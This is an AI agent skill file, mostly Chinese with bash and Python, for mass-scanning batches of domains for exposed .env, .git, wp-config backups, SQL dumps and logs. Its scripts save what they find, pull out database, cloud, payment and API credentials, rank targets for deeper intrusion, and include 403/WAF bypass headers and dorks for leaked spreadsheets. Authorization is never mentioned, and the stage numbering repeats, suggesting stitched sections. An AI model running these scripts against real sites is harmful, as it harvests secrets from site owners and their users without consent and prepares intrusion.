---
name: source-leak-hunt
description: "对存活主机进行大规模扫描，查找暴露的敏感文件（.env、.git、wp-config 备份、日志、数据库转储、phpinfo），并进行基于内容的验证，随后扩展到参数发现、URL 分类、WAF 绕过与历史恢复。合并了原 web-enumeration 技能。"
version: 1.1.0
revision_date: 2026-07-25
license: MIT
platforms: [linux, macos]
compatibility: Requires curl, grep
metadata:
  tags: [recon, source-leak, exposure, secrets, wordpress]
  category: recon
  related_skills:
    - wp-mass-recon
    - js-secrets-extraction
    - error-log-mining
    - phpinfo-to-rce
    - deep-invade
---

# 源码泄露狩猎技能

对暴露的敏感文件（`.env`、`.git/config`、`wp-config.php.bak`、`debug.log`、`backup.sql`、`phpinfo.php`、`Dockerfile` 等）进行大规模扫描，并基于内容过滤误报。源码泄露是仅次于 WordPress 用户枚举的第二常见发现（约占目标的 7%）。

## When to Use

- 在 `skill_view(name='wp-mass-recon')` 确认目标存活之后。
- 对一批域名进行广泛扫描时。
- 当探测可能通向更深层访问的凭据泄露时。
- 作为 `skill_view(name='js-secrets-extraction')` 的补充，用于发现客户端侧机密。

## Prerequisites

- 具备 curl 的 `terminal`。
- 存活 URL 列表（httpx 或 wp-mass-recon 阶段 1 的输出）。
- 持久化：输出目录位于 `$OUTDIR/leaks/`。

## How to Run

```bash
# Quick scan single target (20 paths)
TARGET="https://example.com"
for path in .env .git/config wp-config.php.bak debug.log backup.sql info.php phpinfo.php \
  .env.backup .env.local .env.production wp-config.php~ .git/HEAD .backup.sql \
  docker-compose.yml Dockerfile .DS_Store robots.txt sitemap.xml; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 --connect-timeout 5 "$TARGET/$path")
  [[ "$code" == "200" ]] && echo "HTTP 200: $TARGET/$path"
  sleep 0.2
done
```

## 快速参考

| 路径 | 暴露内容 | 严重程度 |
|------|----------------|----------|
| `.env` | 数据库凭据、API 密钥、应用机密 | 严重 |
| `wp-config.php.bak` | MySQL root 密码、salt | 严重 |
| `.git/config` | 仓库 URL、凭据 | 高 |
| `debug.log` | PHP 错误、服务器路径、SQL 查询 | 高 |
| `backup.sql` | 完整数据库转储 | 严重 |
| `info.php` / `phpinfo.php` | PHP 配置、disable_functions、服务器环境 | 高 |
| `docker-compose.yml` | 服务架构、环境变量 | 中 |
| `Dockerfile` | 构建配置、暴露端口 | 低 |
| `.env.backup` / `.env.local` | 与 .env 相同，仅文件名不同 | 严重 |
| `wp-config.php~` | wp-config 的 Vim 交换文件 | 严重 |
| `.DS_Store` | 目录列表（macOS） | 低 |
| `error_log` | PHP 错误日志（可达数 MB，充满路径/查询） | 高 |

## Procedure

### 步骤 1 — 并行大规模扫描

```bash
#!/bin/bash
URLS_FILE="$1"   # One URL per line
OUTDIR="$OUTDIR/leaks"
mkdir -p "$OUTDIR"

PATHS=(
  ".env"
  ".git/config"
  "wp-config.php.bak"
  "debug.log"
  "backup.sql"
  "info.php"
  "phpinfo.php"
  ".env.backup"
  ".env.local"
  ".env.production"
  "wp-config.php~"
  ".git/HEAD"
  "docker-compose.yml"
  "Dockerfile"
  ".DS_Store"
  "robots.txt"
  "sitemap.xml"
  "error_log"
  "wp-content/debug.log"
  ".backup.sql"
)

# Content verification patterns (avoids SPA catch-all false positives)
declare -A PATTERNS
PATTERNS[".env"]='DB_|APP_|_KEY|_SECRET|DATABASE|PASSWORD|TOKEN'
PATTERNS["wp-config.php.bak"]='DB_NAME|DB_PASSWORD|AUTH_KEY'
PATTERNS[".git/config"]='\[core\]'
PATTERNS["debug.log"]='PHP|ERROR|WARNING|Stack trace'
PATTERNS["backup.sql"]='CREATE TABLE|INSERT INTO|DROP TABLE'
PATTERNS["info.php"]='PHP Version|phpinfo'
PATTERNS["phpinfo.php"]='PHP Version|phpinfo'
PATTERNS[".env.backup"]='DB_|APP_|_KEY|_SECRET'
PATTERNS[".env.local"]='DB_|APP_|_KEY|_SECRET'
PATTERNS[".env.production"]='DB_|APP_|_KEY|_SECRET'
PATTERNS["wp-config.php~"]='DB_NAME|DB_PASSWORD'
PATTERNS["error_log"]='PHP|ERROR|Stack trace'

scan_target() {
  local url="$1"
  local domain
  domain=$(echo "$url" | sed 's|https\?://||' | sed 's|/.*||')

  for path in "${PATHS[@]}"; do
    local full_url="${url}/${path}"
    local code
    code=$(curl -sk -o /tmp/leak_check_$$.tmp -w "%{http_code}" --max-time 5 --connect-timeout 5 "$full_url" 2>/dev/null)

    if [[ "$code" == "200" ]]; then
      local content
      content=$(head -c 2000 /tmp/leak_check_$$.tmp 2>/dev/null)
      local pattern="${PATTERNS[$path]}"

      if [[ -n "$pattern" ]] && echo "$content" | grep -qiE "$pattern"; then
        echo "[LEAK] $full_url (VERIFIED: $path)"
        echo "$full_url" >> "$OUTDIR/${domain}_leaks.txt"
        cp /tmp/leak_check_$$.tmp "$OUTDIR/${domain}_${path//\//_}.content" 2>/dev/null
      elif [[ -z "$pattern" ]]; then
        # No pattern check — just log HTTP 200 (e.g., robots.txt)
        local size=$(wc -c < /tmp/leak_check_$$.tmp)
        if [[ "$size" -gt 50 ]]; then
          echo "[INFO] $full_url (HTTP 200, ${size} bytes)"
          echo "$full_url" >> "$OUTDIR/${domain}_leaks.txt"
        fi
      fi
    fi
    sleep 0.3
  done
  rm -f /tmp/leak_check_$$.tmp
}

export -f scan_target
export OUTDIR
export PATHS

# Run 30 parallel workers
cat "$URLS_FILE" | xargs -P 30 -I {} bash -c 'scan_target "{}"'

echo "[+] Done. Results in $OUTDIR/"
```

### 步骤 2 — 从泄露文件中提取凭据

```bash
# From .env files
grep -rhE '(DB_|APP_|_KEY|_SECRET|DATABASE|PASSWORD|TOKEN|SECRET)=' $OUTDIR/leaks/*.env*.content 2>/dev/null | sort -u

# From wp-config backups
grep -rhE 'DB_NAME|DB_USER|DB_PASSWORD|DB_HOST|AUTH_KEY' $OUTDIR/leaks/*wp-config* 2>/dev/null

# From .git/config
grep -rh 'url = ' $OUTDIR/leaks/*.git_config.content 2>/dev/null

# From SQL dumps
grep -rhE 'CREATE TABLE|INSERT INTO' $OUTDIR/leaks/*backup* $OUTDIR/leaks/*.sql* 2>/dev/null | head -20
```

### 步骤 3 — 寻找存在多处泄露的目标（深挖候选）

```bash
for f in $OUTDIR/leaks/*_leaks.txt; do
  count=$(wc -l < "$f")
  [[ "$count" -ge 3 ]] && echo "$(basename "$f" _leaks.txt): $count leaks"
done | sort -t: -k2 -rn
```

---

## 扩展枚举（合并自 web-enumeration）

以下各节将泄露扫描扩展到更广泛的 Web 枚举：从 `.env` 内容中提取凭据、框架日志挖掘、缓存检测、参数与 URL 分类映射、WAF 绕过以及历史恢复。虚拟主机枚举由 `vhost-enumeration` 负责；路径遍历绕过由 `hunt-lfi` 与 `401-403-bypass-techniques` 负责。

有关与本节配套的有界批量探测模板，请参见 `references/batch-probe-methodology.md`。

## 自动提取 .env 凭据

```python
import re
env_content = requests.get("http://target/.env", timeout=10).text
patterns = {
    "DB_HOST": r"DB_HOST=(.+)",
    "DB_DATABASE": r"DB_DATABASE=(.+)",
    "DB_USERNAME": r"DB_USERNAME=(.+)",
    "DB_PASSWORD": r"DB_PASSWORD=(.+)",
    "APP_KEY": r"APP_KEY=(.+)",
    "APP_URL": r"APP_URL=(.+)",
    "REDIS_HOST": r"REDIS_HOST=(.+)",
    "REDIS_PASSWORD": r"REDIS_PASSWORD=(.+)",
    "MAIL_USERNAME": r"MAIL_USERNAME=(.+)",
    "MAIL_PASSWORD": r"MAIL_PASSWORD=(.+)",
    "AWS_KEY": r"AWS_(?:ACCESS_KEY_ID|SECRET_ACCESS_KEY)=(.+)",
    "SENDGRID": r"SENDGRID_API_KEY=(.+)",
    "SENTRY": r"SENTRY_DSN=(.+)",
    "JWT_SECRET": r"JWT_SECRET=(.+)",
    "OAUTH": r"OAUTH_(?:CLIENT_ID|CLIENT_SECRET)=(.+)",
    "FIREBASE": r"FIREBASE_.+=(.+)",
    "OPENAI": r"OPENAI_API_KEY=(.+)",
    "STRIPE": r"STRIPE_(?:KEY|SECRET)=(.+)",
}
for name, pattern in patterns.items():
    matches = re.findall(pattern, env_content)
    for m in matches:
        print(f"KEY {name}: {m.strip()}")
```

## 日志数据提取

```python
log = requests.get("http://target/storage/logs/laravel.log", timeout=30).text
emails = set(re.findall(r'[\w.+-]+@[\w-]+\.[\w.-]+', log))
for e in sorted(emails):
    if not e.endswith(('.png','.jpg','.svg','.css','.js','.ico','.woff')):
        print(f"EMAIL {e}")
sqls = re.findall(r'(?:SQL:|Executing query:|query:)\s*(.*?)(?:\\\\|$)', log)
for s in set(sqls):
    if len(s) > 10:
        print(f"QUERY {s[:200]}")
jwts = re.findall(r'eyJ[a-zA-Z0-9_\-]{20,}\.[a-zA-Z0-9_\-]{20,}\.[a-zA-Z0-9_\-]{20,}', log)
for j in set(jwts):
    print(f"JWT {j[:80]}...")
paths_found = set(re.findall(r'(?:in |at )/(?:[a-zA-Z0-9_\-./]+\.(?:php|js|ts|py|rb))', log))
for p in sorted(paths_found):
    print(f"PATH {p}")
```

## Varnish 缓存检测

```bash
# Detect cache headers
curl --max-time 30 --connect-timeout 10 -sI "https://TARGET/" | grep -iE "(age|x-cache|via|server)"
# Via: 1.1 varnish = Varnish
# X-Cache: Hit from cloudfront = AWS CloudFront
# Cf-Cache-Status: HIT = Cloudflare
# Varnish Extreme TTL (32 days):
curl --max-time 30 --connect-timeout 10 -sI "https://TARGET/" | grep -iE "age:|max-age|x-cache"
```

### 阶段 6 — 参数发现

在已知端点上查找隐藏参数：

```bash
# paramspider — finds parameters from Wayback data
paramspider -d target.com -o params.txt

# arjun — discovers hidden parameters via HTTP response comparison
arjun -i backend_urls.txt -o arjun_params.json
arjun -u https://target.com/endpoint -m POST

# x8 — hidden parameter discovery
x8 -u "https://target.com/endpoint" -o x8_params.txt

# Prepare URLs for parameter fuzzing
cat all_urls.txt | grep "=" | qsreplace "FUZZ" | anew param_fuzz.txt
# Deduplicate by parameter name
cat all_urls.txt | grep "=" | sed "s/=[^&]*/=/g" | sort -u > params_clean.txt
```

### 阶段 7 — URL 分类提取

按敏感度对发现的 URL 进行分类，以确定测试优先级：

```bash
# JavaScript files (for secret hunting)
cat all_urls.txt | grep -iE '\.js(\?|$)' | grep -iv '\.json' | sort -u > js_urls.txt

# API endpoints
cat all_urls.txt | grep -Ei '\.(json|xml|graphql)(\?|$)' > api_urls.txt

# Backend scripts
cat all_urls.txt | grep -Ei '\.(php|asp|aspx|jsp|cfm|cgi)(\?|$)' > backend_urls.txt

# Auth/login flows
cat all_urls.txt | grep -Ei "login|signin|auth|oauth|reset|password" > auth_urls.txt

# Admin panels
cat all_urls.txt | grep -Ei "admin|dashboard|internal|manage|panel" > admin_urls.txt

# File upload/download
cat all_urls.txt | grep -Ei "upload|file|download|image|media" > upload_urls.txt

# IDOR candidates
cat all_urls.txt | grep -Ei "[0-9]{3,}" > idor_candidates.txt

# Open redirect candidates
cat all_urls.txt | grep -Ei "redirect|callback|goto|return|dest=|r=|u=|url=" > redirect_urls.txt

# Everything interesting in one shot
cat all_urls.txt | urinteresting
```

### 阶段 8 — WAF 与 403 绕过

```bash
# IP header spoofing
ffuf -u https://target.com/blocked-path \
  -w 403_bypass_headers.txt \
  -H "FUZZ" \
  -mc 200,301,302

# Common bypass headers
curl --max-time 30 --connect-timeout 10 -sk "https://target.com/admin" \
  -H "X-Forwarded-For: 127.0.0.1" \
  -H "X-Forwarded-Host: 127.0.0.1" \
  -H "X-Custom-IP-Authorization: 127.0.0.1" \
  -H "X-Original-URL: /admin" \
  -H "X-Rewrite-URL: /admin"

# HTTP method switching
for method in GET POST PUT PATCH DELETE OPTIONS HEAD TRACE; do
  echo -n "$method: "
  curl --max-time 30 --connect-timeout 10 -sk -X "$method" "https://target.com/admin" -o /dev/null -w "%{http_code}"
  echo
done

# Path override techniques
curl --max-time 30 --connect-timeout 10 -sk "https://target.com/anything" -H "X-Original-URL: /admin"
curl --max-time 30 --connect-timeout 10 -sk "https://target.com/anything" -H "X-Rewrite-URL: /admin"
```

### 阶段 9 — 历史页面恢复与 Robots.txt 历史

```bash
# Robots.txt history via roboxtractor
cat alive_subs.txt | roboxtractor -m 1 -wb

# Recover 404 pages via Wayback Machine
waybackurls https://target.com | grep "webstat\|/old/\|/v1/\|/deprecated" > old_pages.txt

# For each old page, re-crawl linked resources
gospider -s https://target.com -a -r \
  | grep -oE 'https?://[^[:space:]"]+' \
  | grep "/old-path/"

# Google Sheets leak hunting
# site:*.target.com intext:"docs.google.com/spreadsheets"
# site:docs.google.com/spreadsheets "target.com" "password"

# GitHub endpoints: find internal API paths in repos
github-endpoints -q -k -d target.com -t $GITHUB_TOKEN
```

## Pitfalls

- **SPA 兜底响应会导致误报，未过滤时占结果的 70% 以上。** 单页应用对任意路径都返回 HTTP 200 和 index.html。必须进行内容验证。
- **CloudFront/S3 错误页。** 某些 CDN 对缺失文件返回 200 以及 XML 错误体。检查内容类型与响应体。
- **大文件内容被截断。** `error_log` 文件可达 1.7MB 以上。分块获取，或使用 `curl -r 0-5000` 采样。
- **git/HEAD 误报。** 某些主题/配置会导致 `.git/HEAD` 返回 200 并带有合法的 git 哈希。应优先验证 `.git/config`。
- **停放/待售域名对任意路径都返回 HTTP 200。** 通用停放页面对 `/.env`、`/.git/config`、`/info.php` 等路径均返回内容且无错误处理——每个路径都返回 200 和相同的落地页。通过检查多个不相关路径是否返回完全相同的内容（相同 body hash、相同 `<title>`，或相同关键字如 "for sale" 或 "parked"）来识别这类情况。加入提前退出：若 `/robots.txt` 与 `/.env` 都返回 200 且 HTML 几乎相同，则将域名标记为停放并跳过后续源码泄露检查。

## Verification

- 每个 `.env` 泄露必须至少包含以下之一：`DB_`、`APP_`、`_KEY`、`_SECRET`、`PASSWORD`、`TOKEN`。
- 每个 `wp-config.php.bak` 泄露必须包含 `DB_NAME` 与 `DB_PASSWORD`。
- 每个 `.git/config` 泄露必须包含 `[core]` 段头。
- 每个 SQL 备份必须包含 DDL（`CREATE TABLE`）或 DML（`INSERT INTO`）语句。
- 记录所有已验证泄露的时间戳与 HTTP 响应大小。

### 阶段 6 — 备份文件发现

```bash
# bfac — multi-level backup file detection
bfac --url https://target.com \
  --detection-technique all \
  --level 3 \
  --exclude-status-codes 404,500

# Wayback Machine — historical sensitive files
waybackurls https://target.com | grep -iE \
  "\.(xls|xlsx|csv|sql|db|bak|backup|old|tar\.gz|tgz|zip|7z|rar|pdf|pem|key|crt|env|json|yml|yaml|conf|config|git|htpasswd|log|dump|DS_Store)" \
  | sort -u > sensitive_wayback.txt

# Check which are still accessible
cat sensitive_wayback.txt | httpx -silent -mc 200 -o accessible_sensitive.txt

# Common backup patterns to probe
for ext in bak old backup zip tar.gz tgz sql dump; do
  curl --max-time 30 --connect-timeout 10 -skI "https://target.com/backup.$ext" | head -1
  curl --max-time 30 --connect-timeout 10 -skI "https://target.com/site.$ext" | head -1
  curl --max-time 30 --connect-timeout 10 -skI "https://target.com/target.$ext" | head -1
  sleep 0.3
done
```

### 阶段 7 — Google 服务泄露 Dorking

```bash
# Google Sheets — internal spreadsheets often left public
# Manual search:
# site:docs.google.com/spreadsheets "target.com"
# site:docs.google.com/spreadsheets "@target.com"
# site:docs.google.com/spreadsheets "password" "target.com"

# Google Drive files
# site:drive.google.com "target.com" "confidential"

# Firebase/Firestore URLs in public search results
# site:firebaseio.com "target.com"
# site:firestore.googleapis.com "target-app"

# GCP buckets
# site:storage.googleapis.com "target"
# site:storage.cloud.google.com "target"
```
